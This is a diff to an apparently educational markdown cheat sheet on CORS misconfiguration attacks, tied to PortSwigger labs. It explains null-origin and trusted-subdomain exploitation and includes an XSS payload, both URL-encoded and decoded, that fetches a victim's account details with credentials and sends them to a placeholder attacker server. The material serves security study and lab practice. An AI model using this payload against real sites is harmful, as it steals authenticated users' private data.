@@ -5,11 +5,17 @@
 * [General Recon For CORS Vulnerabilities](#recon)
 * [Portswigger Labs Cheat Sheet / Payloads](#cheat-sheet)
 
+## Resources
+
+* https://portswigger.net/web-security/cors
+* https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/11-Client-side_Testing/07-Testing_Cross_Origin_Resource_Sharing
+
 ## Recon
 
 ### Identify CORS Misconfigurations
 
-* Analyze all the application’s requests/responses to see if any explicitly support CORS
+* Analyze all the application’s responses to see if any explicitly support CORS
+   * Access-Control-Allow-Origin: https://malicious-website.com 
 
 * Identify what Origins are allowed to submit CORS requests to the application, submit the following header in the requests:
     * Origin: *some-value*
@@ -67,8 +73,8 @@ Access-Control-Allow-Credentials: true
 Access-Control-Allow-Origin: null
 ```
 
-* With these headers in the response, an attacker can host malicious code in their server, that will submit a request to the vulnerable application and direct the authenticated response back to their server.  The malicious code will be within an \<iframe\> that will cause the browser to set the Origin header to “null”.  The attacker now needs to trick the victim user into visiting their website, while they are authenticated to the vulnerable application.
-
+* With these headers in the response, an attacker can host malicious code in their server, that will submit a request to the vulnerable application and direct the authenticated response back to their server.  
+* The malicious code will be within an \<iframe\> that will cause the browser to set the Origin header to “null”.  The attacker now needs to trick the victim user into visiting their website, while they are authenticated to the vulnerable application.
 
     * *Make sure to set the file extension to .html or no extension also works in Exploit Server labs*
 
@@ -98,7 +104,8 @@ Access-Control-Allow-Credentials: true
 Access-Control-Allow-Origin: subdomain.vulnerable-app.com
 ```
 
-* The subdomain is allowed to view the authenticated responses from the main application.  When the XSS script, which essentially will be hosted within the subdomain, is executed, the Origin header will include the **subdomain.vulnerable-app.com** value.  This allows the response to contain the authenticated data. The attacker now needs to trick the victim user into visiting their website, while they are authenticated to the vulnerable application.
+* If the subdomain contains a XSS vulnerability, we can inject a script that will submit a request to the main application and send the response to the attacker’s server.  This will work since the subdomain is allowed to view the authenticated responses from the main application.  
+* When the XSS script executes, the Origin header's value will be **subdomain.vulnerable-app.com**  (reason why is because the xss script is essentially a part of the application now).  This allows the response to contain the authenticated data. The attacker now needs to trick the victim user into visiting their website, while they are authenticated to the vulnerable application.
 
     * *Make sure to set the file extension to .html or no extension also works in Exploit Server labs*
 
@@ -108,6 +115,25 @@ Access-Control-Allow-Origin: subdomain.vulnerable-app.com
 <html>
 <script>
     document.location="http://SUBDOMAIN.VULNERABLE-APPLICATION.com/?productId=4%3cscript%3e var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://VULNERABLE-APPLICATION.com/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://ATTACKERS-SERVER-LOG-LOCATION.net/log?key='%2bthis.responseText; };%3c/script%3e&storeId=1"
+</script>
+</html>
+```
+
+* Decoded Version:
+
+```html
+<html>
+<script>
+   document.location="http://SUBDOMAIN.VULNERABLE-APPLICATION.com/?productId=4
+      <script> 
+         var req = new XMLHttpRequest(); 
+         req.onload = reqListener;
+         req.open('get','https://VULNERABLE-APPLICATION.com/accountDetails',true); 
+         req.withCredentials = true; 
+         req.send();
+         function reqListener() {
+            location='https://ATTACKERS-SERVER-LOG-LOCATION.net/log?key='+this.responseText; 
+      };</script>&storeId=1"
 </script>
 </html>
 ```
